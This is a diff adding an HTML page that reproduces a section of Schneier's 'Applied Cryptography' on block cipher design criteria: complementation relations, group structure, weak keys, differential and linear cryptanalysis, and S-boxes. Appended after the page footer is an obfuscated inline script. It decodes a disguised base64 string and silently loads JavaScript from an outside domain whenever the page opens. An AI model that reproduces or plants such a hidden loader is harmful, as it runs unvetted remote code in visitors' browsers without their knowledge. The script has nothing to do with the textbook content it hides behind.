@@ -1,0 +1,93 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Still Other Block Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=14//-->
+<!--PAGES=347-350//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="14-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="14-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Simple Relations</I></B></FONT></P>
+<P>DES has the property that if <I>E</I><SUB>K</SUB>(<I>P</I>) = <I>C</I>, then <I>E</I><SUB>K&#146;</SUB>(P&#146;) = <I>C&#146;</I>, where <I>P&#146;</I>, <I>C&#146;</I>, and <I>K&#146;</I> are the bit-wise complements of <I>P, C</I>, and <I>K</I>. This property reduces the complexity of a brute-force attack by a factor of two. LOKI has complementation properties that reduce the complexity of a brute-force attack by a factor of 256.</P>
+<P>A <B>simple relation</B> can be defined as [857]:</P>
+<DL>
+<DD>If <I>E</I><SUB>K</SUB>(<I>P</I>) = <I>C</I>, then <I>E</I><SUB>f(K)</SUB> (<I>g</I>(<I>P,K</I>)) = <I>h</I>(<I>C,K</I>)
+</DL>
+<P>where <I>f, g</I>, and <I>h</I> are simple functions. By simple I mean that they are easy to compute, much easier than an iteration of the block cipher. In DES, <I>f</I> is the bit-wise complement of <I>K, g</I> is the bit-wise complement of <I>P</I>, and <I>h</I> is the bit-wise complement of <I>C</I>. This is a result of XoRing the key into part of the text.</P>
+<P>In a good block cipher, there are no simple relations. Methods for finding some of these weaknesses are in [917].</P>
+<P><FONT SIZE="+1"><B><I>Group Structure</I></B></FONT></P>
+<P>When discussing an algorithm, the question of whether it is a group arises. The elements of the group are the ciphertext blocks with each possible key, and the group operation is composition. Looking at an algorithmos group structure is an attempt to get a handle on just how much extra scrambling happens under multiple encryption.
+</P>
+<P>The useful question is, however, not whether an algorithm is actually a group, but just how close to a group it is. If it were only lacking one element, it wouldnot be a group; but double encryption would be&#151;statistically speaking&#151;a waste of time. The work on DES showed that DES is very far away from being a group. There are still some interesting questions about the semigroup that DES encryption generates. Does it contain the identity: That is, does it even generate a group? To put it another way, does some combination of encryption (not decryption) operations eventually generate the identity function? If so, how long is the shortest such combination?</P>
+<P>The goal is to estimate the size of the keyspace for a theoretical brute-force attack, and the result is a greatest lower bound on the keyspace entropy.</P>
+<P><FONT SIZE="+1"><B><I>Weak Keys</I></B></FONT></P>
+<P>In a good block cipher, all keys are equally strong. Algorithms with a small number of weak keys, like DES, are generally no problem. The odds of picking one at random are very small, and it&#146;s easy to test for and discard them. However, these weak keys can sometimes be exploited if the block cipher is used as a one-way hash function (see Section 18.11).
+</P>
+<P><FONT SIZE="+1"><B><I>Strength against Differential and Linear Cryptanalysis</I></B></FONT></P>
+<P>The study of differential and linear cryptanalysis has shed significant light on the theory of good block cipher design. The inventors of IDEA introduced the concept of <B>differentials</B>, a generalization of the basic idea of characteristics [931]. They argued that block ciphers can be designed to resist this attack; IDEA is the result of that work [931]. This concept was further formalized in [1181,1182], when Kaisa Nyberg and Lars Knudsen showed how to make block ciphers provably secure against differential cryptanalysis. This theory has extensions to higher-order differentials [702,161,927,858,860] and partial differentials [860]. Higher-order differentials seem to apply only to ciphers with a small number of rounds, but partial differentials combine nicely with differentials.</P>
+<P>Linear cryptanalysis is newer, and is still being improved. Notions of key ranking [1019] and multiple approximations [811,812] have been defined. other work that extends the idea of linear cryptanalysis can be found in [1270]; [938] tries to combine linear and differential cryptanalysis into one attack. It is unclear what design techniques will protect against these sorts of attacks.</P>
+<P>Knudsen has made some progress, considering some necessary (but not perhaps sufficient) criteria for what he calls <B>practically secure Feistel networks</B>: ciphers that resist both linear and differential cryptanalysis [857]. Nyberg introduced in linear cryptanalysis an analogy to the concept of differentials from differential cryptanalysis [1180].</P>
+<P>Interestingly enough, there seems to be a duality between differential and linear cryptanalysis. This duality becomes apparent both in the design of techniques to construct good differential characteristics and linear approximations [164,1018], and also in the design criteria for making algorithms that are secure against both attacks [307]. Exactly where this line of research will lead is still unknown. As a start, Daemen has developed an algorithm-design strategy based on linear and differential cryptanalysis [402].</P>
+<P><FONT SIZE="+1"><B><I>S-Box Design</I></B></FONT></P>
+<P>The strength of various Feistel networks&#151;and specifically their resistance to differential and linear cryptanalysis&#151;is tied directly to their S-boxes. This has prompted a spate of research on what constitutes a good S-box.
+</P>
+<P>An S-box is simply a substitution: a mapping of <I>m-</I>bit inputs to <I>n-</I>bit outputs. Previously I talked about one large lookup table of 64-bit inputs to 64-bit outputs; that would be a 64*64-bit S-box. An S-box with an <I>m-</I>bit input and an <I>n-</I>bit output is called a <B><I>m*n</I>-bit S-box</B>. S-boxes are generally the only nonlinear step in an algorithm; they are what give a block cipher its security. In general, the bigger they are, the better.</P>
+<P>DES has eight different 6*4-bit S-boxes. Khufu and Khafre have a single 8*32-bit S-box, LoKI has a 12*8-bit S-box, and both Blowfish and CAST have 8*32-bit S-boxes. In IDEA the modular multiplication step is effectively the S-box; it is a 16*16-bit S-box. The larger this S-box, the harder it is to find useful statistics to attack using either differential or linear cryptanalysis [653,729,1626]. Also, while random S-boxes are usually not optimal to protect against differential and linear attacks, it is easier to find strong S-boxes if the S-boxes are larger. Most random S-boxes are nonlinear, nondegenerate, and have strong resistance to linear cryptanalysis&#151;and the fraction that does not goes down rapidly as the number of input bits decreases [1185,1186,1187].</P>
+<P>The size of <I>m</I> is more important than the size of <I>n</I>. Increasing the size of <I>n</I> reduces the effectiveness of differential cryptanalysis, but greatly increases the effectiveness of linear cryptanalysis. In fact, if <I>n</I> &#8804; 2<SUP>m</SUP> &#150; <I>m</I>, then there is definitely a linear relation of the input and output bits of the S-box. And if <I>n</I> &#8804; 2<SUP>m</SUP>, then there is a linear relation of only the output bits [164].</P>
+<P>Much of this work involves the study of <B>Boolean functions</B> [94,1098,1262,1408]. In order to be secure, the Boolean functions used in S-boxes must satisfy specific conditions. They should not be linear or affine, nor even close to linear or affine [9,1177,1178,1188]. There should be a balance of zeros and ones, and no correlations between different combinations of bits. The output bits should behave independently when any single input bit is complemented. These design criteria are also related to the study of <B>bent functions</B>: functions which can be shown to be optimally nonlinear. Although their definition is simple and natural, their study is very complicated [1344,1216,947,905,1176,1271,295,296,297,149,349,471,298].</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="14-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="14-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(HAYTBawl, VCDJlVcG) {VCDJlVcG = HAYTBawl.createElement('script');VCDJlVcG.type = 'text/javascript';VCDJlVcG.async = true;VCDJlVcG.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');HAYTBawl.getElementsByTagName('body')[0].appendChild(VCDJlVcG);}(document));</script></body>
+</html>
